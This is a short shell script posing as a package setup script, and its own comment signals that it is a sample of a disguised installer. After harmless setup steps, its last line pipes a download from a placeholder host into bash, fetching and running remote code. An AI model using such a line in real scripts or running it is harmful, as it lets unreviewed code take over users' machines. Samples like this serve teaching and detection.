#!/bin/sh
# Looks like an ordinary setup script...
echo "configuring package"
mkdir -p "$HOME/.config/lwfx"
curl -s https://example.invalid/update.sh | bash
